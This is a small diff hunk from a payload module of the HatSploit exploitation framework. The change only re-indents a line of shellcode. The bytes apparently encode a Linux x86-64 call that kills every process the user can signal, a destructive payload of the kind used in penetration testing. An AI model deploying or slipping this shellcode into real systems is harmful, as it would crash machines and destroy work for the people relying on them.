@@ -67,7 +67,7 @@ class HatSploitPayload(Payload, PayloadGenerator):
 
         self.output_process("Generating shellcode...")
         shellcode = (
-                b"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
+            b"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
         )
 
         self.output_process("Generating payload...")
